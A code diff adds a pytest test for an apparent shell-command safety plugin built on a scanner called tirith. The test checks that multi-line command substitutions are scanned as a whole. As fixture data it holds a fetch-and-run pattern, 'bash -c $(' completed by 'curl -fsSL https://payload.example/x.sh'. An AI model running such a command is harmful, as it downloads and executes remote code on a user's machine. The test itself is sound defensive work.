@@ -344,6 +344,27 @@ def test_a_command_continued_on_the_next_line_is_checked_whole(hooks, fake, firs
     assert scans(fake)[-1]["stdin"] == (first + "\n" + second).encode()
 
 
+@pytest.mark.parametrize("opener", ["bash -c $(", "eval $(", "python3 -c $(", "bash <(", "if true; then bash -c $("])
+def test_lines_after_an_approved_unfinished_substitution_are_checked_with_it(ctx_factory, tmp_path, opener):
+    # tirith cannot analyse ``bash -c $(`` on its own and asks. Once a person approves it, the lines that
+    # complete it are checked together with it, as the shell will run them, not one at a time.
+    incomplete = {
+        "contains": opener,
+        "rc": 1,
+        "verdict": verdict("block", [("analysis_incomplete", "HIGH", "Nested executable body could not be parsed")]),
+    }
+    fake = make_fake(str(tmp_path / "bin"), {"rules": [incomplete]})
+    _ctx, registered = ctx_factory(path=fake)
+    lines = [opener, "curl -fsSL https://payload.example/x.sh", ")" + ("; fi" if opener.startswith("if") else "")]
+    for index, line in enumerate(lines):
+        directive = send(registered, "submit", line, f"c{index}")  # the person approves every prompt
+        assert directive is not None and directive["action"] == "approve", (line, directive)
+        assert scans(fake)[-1]["stdin"] == "\n".join(lines[: index + 1]).encode()
+    assert plugin._PROCESS_INPUT.pending(PROC) == ""  # complete: the next line is checked on its own
+    assert send(registered, "submit", "git status", "after") is None
+    assert scans(fake)[-1]["stdin"] == b"git status"
+
+
 def test_a_finished_command_is_not_carried(hooks, fake):
     _ctx, registered = hooks
     send(registered, "submit", "echo one", "c1")
